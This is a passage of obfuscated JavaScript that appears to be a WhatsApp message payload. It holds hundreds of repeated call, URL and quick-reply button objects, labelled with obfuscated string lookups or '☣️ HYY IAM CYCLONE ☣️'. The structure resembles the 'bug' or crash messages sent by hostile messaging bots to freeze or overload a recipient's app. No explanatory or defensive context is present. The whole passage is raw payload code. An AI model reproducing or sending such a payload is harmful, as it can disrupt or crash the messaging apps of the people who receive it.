x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'c